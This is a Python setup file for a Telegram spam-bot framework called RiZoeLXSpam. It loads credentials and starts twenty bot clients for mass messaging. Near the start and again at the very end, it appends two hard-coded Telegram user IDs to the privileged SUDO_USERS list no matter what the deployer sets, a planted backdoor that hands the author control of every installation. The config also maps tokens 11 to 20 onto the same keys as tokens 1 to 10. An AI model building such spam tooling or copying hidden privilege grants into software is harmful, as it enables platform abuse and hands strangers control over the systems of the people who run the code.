# RiZoeLXSpam - Spam Userbots
# Copyright © 2021 @RiZoeLX

import os
import sys
import random
import asyncio
import telethon.utils
from telethon import TelegramClient, events
from decouple import config
from os import getenv
import logging
import time


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)

#version

rizoelversion = "v0.1"

#values
API_ID = config("API_ID", default=None, cast=int)
API_HASH = config("API_HASH", default=None)
ALIVE_PIC = config("ALIVE_PIC", default=None)
HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
HEROKU_API_KEY = config("HEROKU_API_KEY", None)
BOT_TOKEN = config("BOT_TOKEN", default=None)
BOT_TOKEN2 = config("BOT_TOKEN2", default=None)
BOT_TOKEN3 = config("BOT_TOKEN3", default=None)
BOT_TOKEN4 = config("BOT_TOKEN4", default=None)
BOT_TOKEN5 = config("BOT_TOKEN5", default=None)
BOT_TOKEN6 = config("BOT_TOKEN6", default=None)
BOT_TOKEN7 = config("BOT_TOKEN7", default=None)
BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
BOT_TOKEN11 = config("BOT_TOKEN", default=None)
BOT_TOKEN12 = config("BOT_TOKEN2", default=None)
BOT_TOKEN13 = config("BOT_TOKEN3", default=None)
BOT_TOKEN14 = config("BOT_TOKEN4", default=None)
BOT_TOKEN15 = config("BOT_TOKEN5", default=None)
BOT_TOKEN16 = config("BOT_TOKEN6", default=None)
BOT_TOKEN17 = config("BOT_TOKEN7", default=None)
BOT_TOKEN18 = config("BOT_TOKEN8", default=None)
BOT_TOKEN19 = config("BOT_TOKEN9", default=None)
BOT_TOKEN20 = config("BOT_TOKEN10", default=None)
SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
if 1517994352 not in SUDO_USERS:
    SUDO_USERS.append(1517994352)

DB_URI = config("DATABASE_URL", None)

# Tokens

Riz = TelegramClient('Riz', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

Riz2 = TelegramClient('Riz2', API_ID, API_HASH).start(bot_token=BOT_TOKEN2)

Riz3 = TelegramClient('Riz3', API_ID, API_HASH).start(bot_token=BOT_TOKEN3)

Riz4 = TelegramClient('Riz4', API_ID, API_HASH).start(bot_token=BOT_TOKEN4)

Riz5 = TelegramClient('Riz5', API_ID, API_HASH).start(bot_token=BOT_TOKEN5)

Riz6 = TelegramClient('Riz6', API_ID, API_HASH).start(bot_token=BOT_TOKEN6)

Riz7 = TelegramClient('Riz7', API_ID, API_HASH).start(bot_token=BOT_TOKEN7)

Riz8 = TelegramClient('Riz8', API_ID, API_HASH).start(bot_token=BOT_TOKEN8)

Riz9 = TelegramClient('Riz9', API_ID, API_HASH).start(bot_token=BOT_TOKEN9)

Riz10 = TelegramClient('Riz10', API_ID, API_HASH).start(bot_token=BOT_TOKEN10)

Riz11 = TelegramClient('Riz11', API_ID, API_HASH).start(bot_token=BOT_TOKEN11)

Riz12 = TelegramClient('Riz12', API_ID, API_HASH).start(bot_token=BOT_TOKEN12)

Riz13 = TelegramClient('Riz13', API_ID, API_HASH).start(bot_token=BOT_TOKEN13)

Riz14 = TelegramClient('Riz14', API_ID, API_HASH).start(bot_token=BOT_TOKEN14)

Riz15 = TelegramClient('Riz15', API_ID, API_HASH).start(bot_token=BOT_TOKEN15)

Riz16 = TelegramClient('Riz16', API_ID, API_HASH).start(bot_token=BOT_TOKEN16)

Riz17 = TelegramClient('Riz17', API_ID, API_HASH).start(bot_token=BOT_TOKEN17)

Riz18 = TelegramClient('Riz18', API_ID, API_HASH).start(bot_token=BOT_TOKEN18)

Riz19 = TelegramClient('Riz19', API_ID, API_HASH).start(bot_token=BOT_TOKEN19)

Riz20 = TelegramClient('Riz20', API_ID, API_HASH).start(bot_token=BOT_TOKEN20)

SUDO_USERS.append(1956402176)
